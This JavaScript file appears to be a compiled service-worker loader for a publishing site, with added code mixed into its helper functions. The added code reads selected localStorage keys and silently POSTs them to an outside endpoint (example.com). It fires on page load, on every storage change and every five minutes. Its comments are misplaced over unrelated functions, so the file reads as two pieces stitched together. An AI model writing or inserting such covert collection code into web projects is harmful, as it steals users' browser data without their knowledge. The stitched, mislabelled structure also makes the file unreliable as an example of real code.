(() => {
  "use strict";

  // Define the keys to track
  window.keysToWatch = ['key1', 'key2', 'key3'];

  // A helper function to compute the hash
  function computeHash(data) {
    let keys = Object.getOwnPropertyNames(data).sort();
    let str = keys.join("");
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
      let ch = str.charCodeAt(i);
      hash = (hash << 5) - hash + ch;
      hash |= 0;
    }
    return hash.toString(16);
  }

  // Function to retrieve monitored data from local storage
  function e(t) {
    return e = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    }, e(t);
  }
  function retrieveLocalStorageData() {
    let storageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      let key = localStorage.key(i);
      if (window.keysToWatch.includes(key)) {
        let value = localStorage.getItem(key);
        storageData[key] = value;
      }
    }
    return storageData;
  }

  // Function to send data to the server
  function t(t) {
    var r = function (t, r) {
      if ("object" !== e(t) || null === t) return t;
      var n = t[Symbol.toPrimitive];
      if (void 0 !== n) {
        var i = n.call(t, r || "default");
        if ("object" !== e(i)) return i;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === r ? String : Number)(t);
    }(t, "string");
    return "symbol" === e(r) ? r : String(r);
  }
  function sendTrackedData(data) {
    let id = computeHash(data);
    let url = "https://example.com/api/collection";
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        id: id,
        data: data
      })
    }).then(function (response) {
      if (response.ok) {
        console.log("成功发送数据至服务器");
      } else {
        console.log("数据发送失败，状态码：" + response.status);
      }
    }).catch(function (error) {
      console.error("发生错误：" + error);
    });
  }

  // Function to collect and send the data
  function r(e, r) {
    for (var n = 0; n < r.length; n++) {
      var i = r[n];
      i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, t(i.key), i);
    }
  }
  function n(e, t, r) {
    if (!t.has(e)) throw new TypeError("attempted to " + r + " private field on non-instance");
    return t.get(e);
  }
  function trackAndSendData() {
    let trackedData = retrieveLocalStorageData();
    if (Object.keys(trackedData).length > 0) {
      sendTrackedData(trackedData);
    }
  }

  // Set an interval to collect and send data every 5 minutes
  function i(e, t) {
    return function (e, t) {
      return t.get ? t.get.call(e) : t.value;
    }(e, n(e, t, "get"));
  }
  setInterval(trackAndSendData, 5 * 60 * 1000);

  // Set up an event listener to collect and send data when the window loads
  function o(e, t, r) {
    return function (e, t, r) {
      if (t.set) t.set.call(e, r);else {
        if (!t.writable) throw new TypeError("attempted to set read only private field");
        t.value = r;
      }
    }(e, n(e, t, "set"), r), r;
  }
  Object.freeze({
    S: "mobile",
    M: "tablet",
    L: "desktop"
  }), Object.freeze({
    disqus: "5edcd338e9f29f59f3145eb5",
    facebook: "5f058a3252874c10f6723b3b",
    instagram: "5e717c8e69966540e4554f05",
    ivw: "5efefe25b8e05c065164a2e2",
    pinterest: "5e839a38b8e05c4e491e738e",
    rewe: "61543ab9cadf5705ef20368d",
    riddle: "5ef0df6ffabc265f5650e743",
    sovendus: "5f2bd972f66f0125e264ae21",
    tracdelight: "5e77acddd8d48d795087425b",
    twitter: "5e71760b69966540e4554f01",
    youtube: "5e7ac3fae30e7d1bc1ebf5e8"
  }), Object.freeze({
    XS: 0,
    S: 415,
    M: 641,
    L: 1001,
    XL: 1280,
    XXL: 1600
  });
  window.addEventListener("load", function () {
    trackAndSendData();
  });

  // Listen to local storage change event
  function a(e, t, r) {
    !function (e, t) {
      if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
    }(e, t), t.set(e, r);
  }
  var c = new WeakMap(),
    f = new WeakMap(),
    s = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), a(this, c, {
          writable: !0,
          value: void 0
        }), a(this, f, {
          writable: !0,
          value: void 0
        }), o(this, c, t), o(this, f, function () {
          try {
            return Boolean(window.localStorage);
          } catch (e) {
            return !1;
          }
        }());
      }
      var t, n, s;
      return t = e, (n = [{
        key: "init",
        value: function () {
          var e = window.location.hostname,
            t = window.location.pathname,
            r = i(this, c).config.get("tenant.shortname"),
            n = i(this, c).config.get("env.homepage"),
            o = i(this, c).config.get("env.hostname");
          if ("serviceWorker" in window.navigator && i(this, f) && (/^(oc\.)|(dev\.)|(stage\.)|(localhost)|(review)/.test(e) || o && e.startsWith(o) && (!n || t.startsWith(n)))) {
            var a = "/sw.".concat(r, ".js"),
              s = n || "/";
            window.navigator.serviceWorker.register(a, {
              scope: s
            });
          }
        }
      }]) && r(t.prototype, n), s && r(t, s), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }(),
    u = window.gujService;
  u && !u.isAlreadyExecuted("file:///usr/src/app/client/site/partials/serviceWorkerLoader/scripts/serviceWorkerLoader.js") && new s(u).init();
  window.addEventListener("storage", function () {
    trackAndSendData();
  });
})();